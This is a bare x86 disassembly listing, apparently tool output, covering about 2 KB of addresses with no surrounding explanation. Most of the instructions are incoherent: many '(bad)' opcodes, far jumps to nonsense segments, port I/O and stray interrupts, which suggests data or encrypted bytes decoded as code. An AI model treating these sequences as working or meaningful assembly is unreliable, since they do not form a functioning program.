  4059da:	pop    ecx
  4059db:	mov    ah,0x3
  4059dd:	push   ebx
  4059de:	push   esp
  4059df:	inc    sp
  4059e1:	dec    edi
  4059e2:	in     al,dx
  4059e3:	sbb    al,0x81
  4059e5:	lea    ebp,[edi]
  4059e7:	imul   ebx,ebx,0x49cb4f12
  4059ed:	push   esi
  4059ee:	pusha  
  4059ef:	popa   
  4059f0:	aad    0x28
  4059f2:	call   0xfc4a:0xf28cce9c
  4059f9:	ret    
  4059fa:	mov    bh,0x3a
  4059fc:	mov    esp,0xf21303c5
  405a01:	jg     0x405a37
  405a03:	scas   al,BYTE PTR es:[edi]
  405a04:	stos   BYTE PTR es:[edi],al
  405a05:	cli    
  405a06:	scas   eax,DWORD PTR es:[edi]
  405a07:	in     al,dx
  405a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a09:	mov    edx,0xd57c6151
  405a0e:	outs   dx,DWORD PTR ds:[esi]
  405a0f:	popf   
  405a10:	mov    al,ds:0xe3d3a777
  405a15:	push   ebx
  405a16:	jbe    0x405a31
  405a18:	add    ch,BYTE PTR [ebx-0x417c1385]
  405a1e:	das    
  405a1f:	add    ebp,ebp
  405a21:	fwait
  405a22:	aad    0xdd
  405a24:	mov    ecx,0xda8ce8a8
  405a29:	or     DWORD PTR [ecx+esi*4+0x7a9c361a],edx
  405a30:	sub    DWORD PTR [eax+0x61d38834],esi
  405a36:	push   ecx
  405a37:	add    al,al
  405a39:	mov    BYTE PTR [ebp-0x1b146ede],dh
  405a3f:	test   ebx,esp
  405a41:	loop   0x405a0c
  405a43:	cmp    ebp,DWORD PTR [esi-0x3f]
  405a46:	rcr    BYTE PTR [ebp-0x13],cl
  405a49:	mov    ecx,0xa3eafee4
  405a4e:	ins    BYTE PTR es:[edi],dx
  405a4f:	loope  0x405aca
  405a51:	clc    
  405a52:	pop    eax
  405a53:	into   
  405a54:	inc    edi
  405a55:	js     0x405ac8
  405a57:	test   BYTE PTR [eax-0x47bb8e3b],0x46
  405a5e:	std    
  405a5f:	mov    dl,0xd0
  405a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a62:	inc    edx
  405a63:	pop    es
  405a64:	mov    al,ds:0x11543724
  405a69:	fcom   DWORD PTR [edx+0x1]
  405a6c:	mov    ah,al
  405a6e:	mov    edi,0xa29d8eea
  405a73:	ret    0x4fb6
  405a76:	arpl   WORD PTR [ebx-0x6d],cx
  405a79:	(bad)  
  405a7a:	push   eax
  405a7b:	lods   al,BYTE PTR ds:[esi]
  405a7c:	jb     0x405af0
  405a7e:	and    eax,0xa25747b
  405a83:	mov    eax,ds:0x707f06de
  405a88:	push   edx
  405a89:	jle    0x405ad8
  405a8b:	and    ah,cl
  405a8d:	fcom   DWORD PTR [esi-0x79]
  405a90:	mov    ah,0xe6
  405a92:	movlps xmm7,QWORD PTR [ebx+0x36926490]
  405a99:	mov    al,ds:0x5ac6dcf
  405a9e:	inc    ecx
  405a9f:	out    0x46,eax
  405aa1:	push   edx
  405aa2:	sti    
  405aa3:	cmp    eax,0x29b9bd92
  405aa8:	xor    ebx,DWORD PTR [ebx+esi*4+0x3e79488b]
  405aaf:	or     ecx,DWORD PTR [ebx+0x5c]
  405ab2:	loope  0x405a7d
  405ab4:	xor    eax,0xaa95fe41
  405ab9:	push   esi
  405aba:	es sbb al,0x56
  405abd:	cmp    ebp,esi
  405abf:	out    0x8b,al
  405ac1:	cmp    esi,DWORD PTR [edi]
  405ac3:	cli    
  405ac4:	jns    0x405aa5
  405ac6:	cmp    eax,DWORD PTR [ebp-0x7a]
  405ac9:	add    al,bh
  405acb:	xor    eax,0x6a9ecad2
  405ad0:	data16 cmp al,0x3e
  405ad3:	jmp    0x405b27
  405ad5:	push   0xed5e01a
  405ada:	mov    WORD PTR [eax+0x7ecf9af1],ds
  405ae0:	inc    ebp
  405ae1:	ret    0x2230
  405ae4:	arpl   WORD PTR [eax+0x5d],si
  405ae7:	adc    eax,DWORD PTR [ebx+0x58]
  405aea:	inc    esp
  405aeb:	scas   eax,DWORD PTR es:[edi]
  405aec:	mov    ds:0x4907b7a9,al
  405af1:	xchg   BYTE PTR [bp+si+0xd71],ch
  405af6:	repnz xor DWORD PTR [esi-0x32],ebp
  405afa:	addr16 loope 0x405b70
  405afd:	mov    WORD PTR [edi+ebx*4+0xc1e1a0e],cs
  405b04:	aad    0x70
  405b06:	fwait
  405b07:	inc    edx
  405b08:	cmp    al,0xac
  405b0a:	loopne 0x405aa9
  405b0c:	or     eax,ebx
  405b0e:	or     BYTE PTR [edi+0x31dc5ebe],ah
  405b14:	(bad)  
  405b15:	xor    eax,0xb6d206f2
  405b1a:	mov    fs,edx
  405b1c:	sub    BYTE PTR [edi+0x1e97d746],bl
  405b22:	jmp    0x405ae9
  405b24:	push   cs
  405b25:	iret   
  405b26:	pop    esp
  405b27:	ja     0x405b24
  405b29:	xchg   ecx,eax
  405b2a:	dec    esi
  405b2b:	lea    eax,[ebp+esi*4-0x3042900e]
  405b32:	mov    ebp,0xcdadf537
  405b37:	mov    dl,0x88
  405b39:	mov    ds:0xb86b384d,eax
  405b3e:	mov    ds:0x95e242b2,al
  405b43:	pop    eax
  405b44:	outs   dx,BYTE PTR ds:[esi]
  405b45:	in     al,dx
  405b46:	xchg   esp,eax
  405b47:	sbb    DWORD PTR [ebx],esp
  405b49:	mov    edi,eax
  405b4b:	(bad)
  405b4f:	cdq    
  405b50:	jecxz  0x405b2b
  405b52:	sti    
  405b53:	jnp    0x405b6f
  405b55:	dec    BYTE PTR [eax]
  405b57:	dec    eax
  405b58:	std    
  405b59:	xchg   ecx,edx
  405b5b:	jae    0x405b9b
  405b5d:	mov    dh,0x7
  405b5f:	aam    0x94
  405b61:	mov    ecx,0xa2ed59a5
  405b66:	push   esp
  405b67:	ins    BYTE PTR es:[edi],dx
  405b68:	sbb    DWORD PTR [ebp+0x51],0x29
  405b6c:	jb     0x405ba1
  405b6e:	mov    ah,dl
  405b70:	pop    ds
  405b71:	adc    eax,DWORD PTR [esi+0x31873806]
  405b77:	push   ebx
  405b78:	out    dx,eax
  405b79:	sbb    eax,0x4d63d592
  405b7e:	adc    BYTE PTR [ebp-0x11],cl
  405b81:	and    ebp,DWORD PTR [edx-0x6533d6b2]
  405b87:	dec    edi
  405b88:	dec    esp
  405b89:	imul   ebx,DWORD PTR ds:0x14857304,0x1225070c
  405b93:	and    BYTE PTR fs:[esi+0x1c0abf27],dh
  405b9a:	adc    bh,dl
  405b9c:	push   ss
  405b9d:	jge    0x405bbb
  405b9f:	adc    DWORD PTR [ecx+ecx*4],ebp
  405ba2:	dec    eax
  405ba3:	pop    ebp
  405ba4:	outs   dx,DWORD PTR ds:[esi]
  405ba5:	pop    ss
  405ba6:	xchg   esp,eax
  405ba7:	mov    ebx,0x423a2a56
  405bac:	mov    ds:0x416d75a3,eax
  405bb1:	and    DWORD PTR [ebx],eax
  405bb3:	add    BYTE PTR [eax+0x33541dab],bh
  405bb9:	cmp    al,0x1c
  405bbb:	in     eax,dx
  405bbc:	shl    ebx,cl
  405bbe:	das    
  405bbf:	and    eax,DWORD PTR [ecx]
  405bc1:	adc    eax,0xc31c635
  405bc6:	sbb    ecx,DWORD PTR [eax+0x36a6fe9b]
  405bcc:	ret    
  405bcd:	and    eax,0x7948059c
  405bd2:	sbb    DWORD PTR [ebp-0x32],esi
  405bd5:	mov    ?,ecx
  405bd7:	cmp    edx,ebx
  405bd9:	retf   0xfe0c
  405bdc:	shr    BYTE PTR [edx],cl
  405bde:	mov    BYTE PTR [edx],cl
  405be0:	pop    edi
  405be1:	les    esi,FWORD PTR [ecx+0x76458028]
  405be7:	inc    esp
  405be8:	xchg   BYTE PTR [edi+eiz*4-0x3a9219a7],bl
  405bef:	dec    esp
  405bf0:	jmp    edi
  405bf2:	cdq    
  405bf3:	add    edi,DWORD PTR [eax]
  405bf5:	jge    0x405c18
  405bf7:	adc    BYTE PTR [ebx],ch
  405bf9:	lods   al,BYTE PTR ds:[esi]
  405bfa:	das    
  405bfb:	add    BYTE PTR gs:[ecx],dl
  405bfe:	leave  
  405bff:	push   ds
  405c00:	stos   DWORD PTR es:[edi],eax
  405c01:	mov    ds:0xfef28ad,al
  405c06:	aad    0x8a
  405c08:	lods   eax,DWORD PTR ds:[esi]
  405c09:	jnp    0x405ba3
  405c0b:	jmp    0xaa12:0x79bcabc4
  405c12:	jbe    0x405bf7
  405c14:	or     edx,DWORD PTR [ecx]
  405c16:	pop    esi
  405c17:	cld    
  405c18:	dec    esp
  405c19:	dec    esp
  405c1a:	push   edx
  405c1b:	pusha  
  405c1c:	fistp  QWORD PTR [edi-0x39c97dae]
  405c22:	fldenv [esi-0x1a]
  405c25:	lods   eax,DWORD PTR ds:[esi]
  405c26:	lods   eax,DWORD PTR es:[esi]
  405c28:	adc    bl,BYTE PTR [ebx+0x3328c9da]
  405c2e:	inc    edx
  405c2f:	sub    eax,0x4405b1bf
  405c34:	pop    es
  405c35:	dec    esp
  405c36:	clc    
  405c37:	sub    DWORD PTR [ebx-0x77fed744],eax
  405c3d:	pop    edx
  405c3e:	rol    al,cl
  405c40:	cmp    esi,edi
  405c42:	push   ebx
  405c43:	mov    esi,0x262f8400
  405c48:	pop    edx
  405c49:	add    al,0x1
  405c4b:	jo     0x405cbc
  405c4d:	dec    ecx
  405c4e:	(bad)  
  405c4f:	inc    ebx
  405c50:	inc    ecx
  405c51:	fldenv [edi+edi*4+0x39]
  405c55:	aas    
  405c56:	pop    esi
  405c57:	addr16 or eax,0xbf4b3223
  405c5d:	pop    ebx
  405c5e:	mov    ecx,0x21f3bd31
  405c63:	iret   
  405c64:	ret    0xc363
  405c67:	add    bl,BYTE PTR [esi+0x13241c61]
  405c6d:	cmc    
  405c6e:	jg     0x405ce0
  405c70:	sbb    edx,DWORD PTR [ebx-0x63]
  405c73:	mov    ds:0x5cd39113,eax
  405c78:	je     0x405c89
  405c7a:	dec    DWORD PTR [ebx-0x16]
  405c7d:	das    
  405c7e:	xor    eax,0xd0f7c7ff
  405c83:	sbb    al,0x95
  405c85:	jle    0x405ca2
  405c87:	jo     0x405ce7
  405c89:	or     DWORD PTR [ebp+0x1035a95c],0x77
  405c90:	mov    esp,0x9dcc70c2
  405c95:	mov    ah,0x72
  405c97:	mov    al,ds:0xe37ba472
  405c9c:	das    
  405c9d:	pop    ecx
  405c9e:	dec    eax
  405c9f:	cs pop ebp
  405ca1:	mov    DWORD PTR [edi],ebx
  405ca3:	sti    
  405ca4:	ins    DWORD PTR es:[edi],dx
  405ca5:	pop    ebp
  405ca6:	call   0xde7f:0x441cf546
  405cad:	inc    esp
  405cae:	iret   
  405caf:	int3   
  405cb0:	inc    ebx
  405cb1:	xor    ebx,DWORD PTR [esp+ebx*8+0x6496081f]
  405cb8:	jecxz  0x405c5d
  405cba:	arpl   WORD PTR [eax],bp
  405cbc:	loope  0x405ce7
  405cbe:	inc    ebp
  405cbf:	in     al,dx
  405cc0:	retf   
  405cc1:	push   0x87194cfa
  405cc6:	aad    0xe1
  405cc8:	and    BYTE PTR [eax-0x64db0025],0x87
  405ccf:	mov    DWORD PTR [eax+esi*8-0x68db7579],0xeae91ff6
  405cda:	jecxz  0x405cd2
  405cdc:	das    
  405cdd:	mov    ?,WORD PTR [ecx-0x7ffd2886]
  405ce3:	dec    ebx
  405ce4:	jns    0x405d63
  405ce6:	sahf   
  405ce7:	add    BYTE PTR [edx-0x42dbbc60],dl
  405ced:	push   esp
  405cee:	iret   
  405cef:	(bad)  
  405cf2:	gs in  eax,dx
  405cf4:	out    0xac,al
  405cf6:	mov    ds:0x558bcce1,al
  405cfb:	int3   
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	ret    0x1388
  405d2e:	jl     0x405d5f
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d26
  405d38:	jns    0x405d07
  405d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d3b:	jp     0x405cc2
  405d3d:	xor    ah,BYTE PTR [ecx+eiz*2]
  405d40:	mov    ds:0x928bb29f,eax
  405d45:	stc    
  405d46:	ja     0x405cf9
  405d48:	in     eax,dx
  405d49:	pop    edx
  405d4a:	cmp    DWORD PTR [esi+0x609a2810],0xffffffca
  405d51:	xor    ch,BYTE PTR [esi-0x45]
  405d54:	push   0x5df45661
  405d59:	xor    eax,0xccd8841
  405d5e:	cs mov cl,0xc3
  405d61:	ins    BYTE PTR es:[edi],dx
  405d62:	adc    BYTE PTR [edx+edx*2-0x4ca8e303],cl
  405d69:	sbb    eax,0x972b6003
  405d6e:	pop    edx
  405d6f:	popa   
  405d70:	and    al,0x8b
  405d72:	stos   DWORD PTR es:[edi],eax
  405d73:	add    edi,DWORD PTR [esi-0x24458d1]
  405d79:	adc    eax,0x951f185b
  405d7e:	xchg   esi,eax
  405d7f:	add    al,BYTE PTR [edi+eiz*4]
  405d82:	das    
  405d83:	push   eax
  405d84:	ins    BYTE PTR es:[edi],dx
  405d85:	cmp    edi,DWORD PTR [eax-0x47]
  405d88:	inc    ebp
  405d89:	inc    ebx
  405d8a:	xor    ah,BYTE PTR [esi]
  405d8c:	pop    esi
  405d8d:	jne    0x405df7
  405d8f:	(bad)  
  405d90:	fdiv   QWORD PTR [edi-0x6e516b25]
  405d96:	lea    edi,[ecx]
  405d98:	jg     0x405d91
  405d9a:	sub    al,cl
  405d9c:	aas    
  405d9d:	mov    esp,0xcabd3aac
  405da2:	enter  0x4454,0x9a
  405da6:	sub    bh,dh
  405da8:	mov    edi,0x97b0fc81
  405dad:	mov    al,0x7
  405daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405db0:	fld    QWORD PTR [edx-0x80]
  405db3:	repz data16 aam 0x4c
  405db7:	sub    eax,0x96747378
  405dbc:	pusha  
  405dbd:	push   esi
  405dbe:	clc    
  405dbf:	fmul   DWORD PTR [ecx]
  405dc1:	sbb    eax,0xc1ae7b14
  405dc6:	out    0xc2,al
  405dc8:	ja     0x405d9d
  405dca:	loop   0x405d6a
  405dcc:	popa   
  405dcd:	xor    ch,bl
  405dcf:	lahf   
  405dd0:	ja     0x405d83
  405dd2:	cmp    BYTE PTR [edi-0x41],ch
  405dd5:	fisub  DWORD PTR [esi+0x42]
  405dd8:	sbb    cl,BYTE PTR [ecx+0x33]
  405ddb:	call   0x65faa31c
  405de0:	mov    eax,ds:0x60d7fa2b
  405de5:	and    esi,DWORD PTR ds:0x4e63ba7a
  405deb:	jg     0x405de3
  405ded:	mov    ecx,0x8549ee08
  405df2:	aad    0x90
  405df4:	push   edi
  405df5:	js     0x405df4
  405df7:	pop    ecx
  405df8:	inc    esp
  405df9:	ret    
  405dfa:	add    ecx,DWORD PTR [ebp-0x2a]
  405dfd:	and    eax,ebx
  405dff:	xor    eax,edi
  405e01:	pop    esi
  405e02:	pop    esp
  405e03:	gs or  ch,ah
  405e06:	(bad)  
  405e07:	std    
  405e08:	clc    
  405e09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0a:	inc    edi
  405e0b:	aaa    
  405e0c:	xor    ecx,0x24251368
  405e12:	icebp  
  405e13:	jbe    0x405e34
  405e15:	or     al,0x14
  405e17:	jg     0x405dcc
  405e19:	out    dx,eax
  405e1a:	mov    ch,0xeb
  405e1c:	mov    ebx,0x318ba71e
  405e21:	adc    al,BYTE PTR [ebx-0x6033324b]
  405e27:	shl    DWORD PTR [ebp-0x1abef5d0],cl
  405e2d:	mov    edx,0x154369d1
  405e32:	fimul  DWORD PTR [ebx-0x2576dc0c]
  405e38:	mov    ebx,0x6e404070
  405e3d:	xchg   ebp,eax
  405e3e:	mov    WORD PTR [esi+ebx*8-0x1d],gs
  405e42:	jp     0x405df2
  405e44:	mov    esp,0x2902792e
  405e49:	sub    ecx,DWORD PTR cs:[ebx+0x1fa09a25]
  405e50:	jmp    0x43d3:0xd8f04355
  405e57:	add    BYTE PTR [edi+0x154a6b74],al
  405e5d:	sub    BYTE PTR [ebp+0x3e],0x89
  405e61:	and    ebp,DWORD PTR [ecx+0x6b1fc43f]
  405e67:	push   eax
  405e68:	pop    ecx
  405e69:	xchg   esi,eax
  405e6a:	xchg   BYTE PTR [ebp+eiz*1-0x2d],bh
  405e6e:	sub    al,0xdc
  405e70:	add    ch,BYTE PTR [ebx]
  405e72:	addr16 xchg edx,eax
  405e74:	outs   dx,BYTE PTR ds:[esi]
  405e75:	lock out dx,eax
  405e77:	outs   dx,DWORD PTR ds:[esi]
  405e78:	out    0xd8,eax
  405e7a:	push   ds
  405e7b:	push   es
  405e7c:	ss enter 0xc8ec,0x79
  405e81:	cli    
  405e82:	je     0x405efc
  405e84:	jae    0x405ef8
  405e86:	out    0xe5,eax
  405e88:	xchg   BYTE PTR gs:[esi+edi*2+0x7],bh
  405e8d:	sbb    al,0x1d
  405e8f:	loop   0x405eb0
  405e91:	mov    ecx,ds
  405e93:	push   0x128a7348
  405e98:	clc    
  405e99:	ret    0x63fc
  405e9c:	ins    DWORD PTR es:[edi],dx
  405e9d:	call   0xdcbd9284
  405ea2:	(bad)
  405ea5:	leavew 
  405ea7:	pusha  
  405ea8:	and    esi,0x6f
  405eab:	fsubrp st(6),st
  405ead:	pop    ss
  405eae:	aas    
  405eaf:	or     cl,BYTE PTR [esi+ecx*1]
  405eb2:	jecxz  0x405f0e
  405eb4:	mov    eax,0xfbe4e84c
  405eb9:	cmp    DWORD PTR [ebp+0x7e],eax
  405ebc:	imul   ebx,DWORD PTR [ecx+0x6f],0x25
  405ec0:	lods   al,BYTE PTR ds:[esi]
  405ec1:	(bad)  
  405ec2:	pop    ds
  405ec3:	je     0x405f14
  405ec5:	out    0x2f,eax
  405ec7:	test   edx,edi
  405ec9:	cmp    BYTE PTR [eax+0x53],bh
  405ecc:	addr16 and dl,ch
  405ecf:	(bad)  
  405ed0:	out    dx,eax
  405ed1:	pusha  
  405ed2:	xchg   ebp,eax
  405ed3:	popa   
  405ed4:	fisub  WORD PTR [ecx+0x1369bf7e]
  405eda:	mul    DWORD PTR [eax+0x7206ced]
  405ee0:	mov    edi,0xa1e16d76
  405ee5:	test   al,0x7b
  405ee7:	sbb    edi,edi
  405ee9:	fisub  WORD PTR [ebx]
  405eeb:	stc    
  405eec:	jno    0x405e7d
  405eee:	lea    ebp,[edx+edx*1-0x53]
  405ef2:	pop    ebx
  405ef3:	pop    eax
  405ef4:	add    DWORD PTR [ebp-0x55],ebp
  405ef7:	adc    eax,0xf7660145
  405efc:	sar    DWORD PTR [edx+0x6a],0xd8
  405f00:	and    al,0x11
  405f02:	mov    dh,dl
  405f04:	push   eax
  405f05:	sbb    cl,0xb7
  405f08:	adc    ecx,edx
  405f0a:	mov    edx,0xc1f2a648
  405f0f:	xchg   esp,eax
  405f10:	test   BYTE PTR [ecx],ah
  405f12:	lods   al,BYTE PTR gs:[esi]
  405f14:	add    ch,cl
  405f16:	out    0x1c,al
  405f18:	mov    BYTE PTR [ebp+0x31294335],ah
  405f1e:	cld    
  405f1f:	add    al,BYTE PTR [edx+0x6eaaba25]
  405f25:	out    0xd1,eax
  405f27:	xor    DWORD PTR ds:0x96b93be6,esi
  405f2d:	mov    al,ds:0xf409b302
  405f32:	aas    
  405f33:	push   0x44748ad0
  405f38:	cmp    ebp,DWORD PTR [ebx-0x6]
  405f3b:	iret   
  405f3c:	mov    cl,0xec
  405f3e:	adc    eax,0xa63f24df
  405f43:	int    0x33
  405f45:	or     eax,0x75c120c6
  405f4a:	xchg   edx,eax
  405f4b:	shr    BYTE PTR [ebp-0xbef4c18],1
  405f51:	jne    0x405f8c
  405f53:	add    al,0x58
  405f55:	add    DWORD PTR [ebx],esp
  405f57:	hlt    
  405f58:	cmp    ecx,ecx
  405f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f5b:	iret   
  405f5c:	iret   
  405f5d:	ret    0x1e05
  405f60:	jg     0x405fb6
  405f62:	stos   DWORD PTR es:[edi],eax
  405f63:	inc    esp
  405f64:	mov    edi,0x65c79280
  405f69:	mov    dh,0x3e
  405f6b:	retf   
  405f6c:	outs   dx,BYTE PTR ds:[esi]
  405f6d:	jecxz  0x405f09
  405f6f:	cmp    al,0x40
  405f71:	inc    edx
  405f72:	jmp    DWORD PTR [edi-0xf]
  405f75:	pop    es
  405f76:	jnp    0x405f30
  405f78:	icebp  
  405f79:	and    al,0x68
  405f7b:	ss push cs
  405f7d:	in     al,dx
  405f7e:	leave  
  405f7f:	xchg   edx,eax
  405f80:	cmp    al,cl
  405f82:	clc    
  405f83:	(bad)  
  405f84:	mov    esi,0x5a1090e0
  405f89:	dec    ecx
  405f8a:	sub    BYTE PTR [ebx+0x1b],0x65
  405f8e:	xchg   esp,eax
  405f8f:	jecxz  0x405f6d
  405f91:	(bad)  
  405f92:	push   ds
  405f93:	jno    0x406004
  405f95:	repz push edi
  405f97:	mov    ds:0xf3f50e37,al
  405f9c:	fidivr WORD PTR [ecx+0x51]
  405f9f:	out    0xb4,al
  405fa1:	lahf   
  405fa2:	sbb    al,0x50
  405fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fa5:	jns    0x405f67
  405fa7:	xchg   esi,eax
  405fa8:	xchg   edx,eax
  405fa9:	dec    eax
  405faa:	and    edx,DWORD PTR [ebx+0xa4d2f34]
  405fb0:	lods   eax,DWORD PTR ds:[esi]
  405fb1:	addr16 pop ecx
  405fb3:	ror    DWORD PTR [ecx-0x1568e86d],0xf2
  405fba:	(bad)  
  405fbb:	leave  
  405fbc:	dec    edx
  405fbd:	fs daa 
  405fbf:	sub    BYTE PTR [esp+ebp*4+0x66266f6],bl
  405fc6:	inc    ecx
  405fc7:	div    eax
  405fc9:	mov    bh,0x8f
  405fcb:	xchg   edi,eax
  405fcc:	dec    esi
  405fcd:	ins    BYTE PTR es:[edi],dx
  405fce:	in     eax,0xba
  405fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd1:	sub    eax,0x8981c993
  405fd6:	lods   eax,DWORD PTR ds:[esi]
  405fd7:	jmp    0x58943d94
  405fdc:	mov    ebp,esp
  405fde:	mov    eax,0x158790c1
  405fe3:	xchg   ecx,eax
  405fe4:	in     eax,0xeb
  405fe6:	cdq    
  405fe7:	scas   al,BYTE PTR es:[edi]
  405fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fe9:	lods   eax,DWORD PTR ds:[esi]
  405fea:	sub    BYTE PTR [eax+ebp*4+0x5],0xf4
  405fef:	stos   BYTE PTR es:[edi],al
  405ff0:	iret   
  405ff1:	sub    eax,0x43ef801d
  405ff6:	cwde   
  405ff7:	popa   
  405ff8:	jne    0x405fa6
  405ffa:	sub    BYTE PTR [edi+ebp*1],dl
  405ffd:	ffree  st(7)
  405fff:	fimul  DWORD PTR [ebp+0x14b31ba0]
  406005:	sub    eax,0xb6be333e
  40600a:	fisub  WORD PTR [eax-0x4d4ce79c]
  406010:	mov    edx,0x2963ef26
  406015:	or     ebp,eax
  406017:	cmp    eax,0x6a101700
  40601c:	push   0x34a2dda6
  406021:	js     0x405fac
  406023:	shl    DWORD PTR [edi-0x18],1
  406026:	mov    bl,0xde
  406028:	iret   
  406029:	test   eax,edi
  40602b:	out    dx,al
  40602c:	add    BYTE PTR [edi-0x288e7c96],bh
  406032:	xchg   edi,edi
  406034:	and    DWORD PTR [eax+ebp*4-0xe],esi
  406038:	shr    ebp,1
  40603a:	pop    ds
  40603b:	mov    bl,al
  40603d:	daa    
  40603e:	daa    
  40603f:	push   cs
  406040:	inc    ecx
  406041:	jb     0x406088
  406043:	xor    DWORD PTR [edi],esi
  406045:	scas   eax,DWORD PTR es:[edi]
  406046:	into   
  406047:	div    BYTE PTR [esi]
  406049:	push   edx
  40604a:	xchg   BYTE PTR [ecx+0x2b2b7fd6],bl
  406050:	pop    ss
  406051:	jb     0x406082
  406053:	repz xchg ebx,eax
  406055:	out    0xf3,eax
  406057:	xor    bl,BYTE PTR [edi-0x176dd3b6]
  40605d:	imul   ah
  40605f:	into   
  406060:	mov    cl,0xb5
  406062:	lods   eax,DWORD PTR ds:[esi]
  406063:	fsubrp st(2),st
  406065:	jnp    0x405fe7
  406067:	out    dx,eax
  406068:	push   ebx
  406069:	mov    ds:0xaaa54a4b,al
  40606e:	dec    eax
  40606f:	add    ah,BYTE PTR [ebx-0x4c]
  406072:	ins    DWORD PTR es:[edi],dx
  406073:	cmp    BYTE PTR [ebx],0xda
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xc9
  40608b:	or     al,0x1e
  40608d:	call   0x7d33:0x7e7e3de0
  406094:	jle    0x406114
  406096:	jmp    0x1735e321
  40609b:	lea    ecx,[edi-0x1870f3bd]
  4060a1:	ds jb  0x406083
  4060a4:	xchg   ecx,eax
  4060a5:	adc    edi,DWORD PTR [eax+0x1a206200]
  4060ab:	push   cs
  4060ac:	pop    ss
  4060ad:	push   cs
  4060ae:	jo     0x406090
  4060b0:	fdivr  DWORD PTR [ebp+0x9eac166]
  4060b6:	stos   DWORD PTR es:[edi],eax
  4060b7:	shl    DWORD PTR [esi+ebp*2-0x73],0xa6
  4060bc:	adc    al,0x69
  4060be:	jmp    0x63d2:0xb48de9da
  4060c5:	das    
  4060c6:	xchg   DWORD PTR ds:0xc24a784a,ebp
  4060cc:	or     edx,ecx
  4060ce:	xor    ch,bh
  4060d0:	jmp    esi
  4060d2:	push   ss
  4060d3:	mov    dh,0x3a
  4060d5:	cs hlt 
  4060d7:	push   eax
  4060d8:	fsubr  DWORD PTR [ebx+0x8]
  4060db:	xor    eax,0x6246f1c2
  4060e0:	in     eax,dx
  4060e1:	data16 or dh,BYTE PTR [ebp+ebx*1+0x7383d9b5]
  4060e9:	adc    al,0x2d
  4060eb:	stc    
  4060ec:	mov    ss,WORD PTR [ecx]
  4060ee:	shr    DWORD PTR [eax],1
  4060f0:	xor    eax,0x4f8b3bae
  4060f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060f6:	(bad)  
  4060f7:	lahf   
  4060f8:	out    0xb6,al
  4060fa:	jge    0x406099
  4060fc:	(bad)  
  4060fd:	jne    0x40611c
  4060ff:	shr    BYTE PTR [ebp-0x23034980],1
  406105:	(bad)  
  406106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406107:	aam    0x2
  406109:	(bad)  
  40610a:	mov    bl,0x2c
  40610c:	mov    edi,0xcb582d72
  406111:	popf   
  406112:	stc    
  406113:	xor    ecx,ecx
  406115:	jle    0x4060f8
  406117:	fst    DWORD PTR [esi]
  406119:	sar    DWORD PTR [esi-0xd32ef72],0x1a
  406120:	loope  0x4060b6
  406122:	adc    DWORD PTR [ebp-0x12],edi
  406125:	mov    bl,0xf2
  406127:	push   ss
  406128:	dec    ecx
  406129:	or     eax,0x39ab2f98
  40612e:	(bad)  
  40612f:	mov    dl,0xee
  406131:	inc    edi
  406132:	adc    ebx,esp
  406134:	int    0x21
  406136:	int    0x80
  406138:	imul   ebx,edx,0xffffffeb
  40613b:	cmp    BYTE PTR [ebp+0x50ae5c03],ah
  406141:	fisttp WORD PTR [edi+0x66]
  406144:	lods   al,BYTE PTR ds:[esi]
  406145:	test   BYTE PTR [edx],al
  406147:	jmp    0x4d3e5d36
  40614c:	add    bh,BYTE PTR [ebp+0x4e1e0e40]
  406152:	repnz fst QWORD PTR [esi-0x22973bc5]
  406159:	sub    DWORD PTR [ebx+ebp*8+0x5e],ebx
  40615d:	mov    edi,eax
  40615f:	push   ds
  406160:	je     0x4061bb
  406162:	popa   
  406163:	sub    esi,DWORD PTR gs:[esi+0x723593e]
  40616a:	xchg   ebx,eax
  40616b:	cmp    BYTE PTR [eax+0x2e],dh
  40616e:	pop    edx
  40616f:	pop    es
  406170:	fwait
  406171:	mov    dh,0xea
  406173:	test   DWORD PTR [ebp-0x7a],ebp
  406176:	push   cs
  406177:	mov    al,0xc4
  406179:	xchg   esp,eax
  40617a:	int3   
  40617b:	fidiv  DWORD PTR [esi]
  40617d:	mov    bl,0x65
  40617f:	mov    ecx,0x19028805
  406184:	ins    BYTE PTR es:[edi],dx
  406185:	ds xor eax,0xa6cca583
  40618b:	jno    0x40613f
  40618d:	lods   al,BYTE PTR ds:[esi]
  40618e:	sti    
  40618f:	mov    dl,0x36
  406191:	inc    ecx
  406192:	fwait
  406193:	sbb    eax,0x106067c4
  406198:	mov    al,ds:0x5597e284
  40619d:	pop    ecx
  40619e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40619f:	or     al,0x4
  4061a1:	ins    DWORD PTR es:[edi],dx
  4061a2:	fidivr DWORD PTR [eax]
  4061a4:	sub    BYTE PTR [ecx],0xe8
  4061a7:	inc    ebp
  4061a8:	mov    eax,ds:0xd40b4ed
  4061ad:	mov    eax,ds:0x176e62c2
  4061b2:	outs   dx,DWORD PTR ds:[esi]
  4061b3:	xor    al,0x88
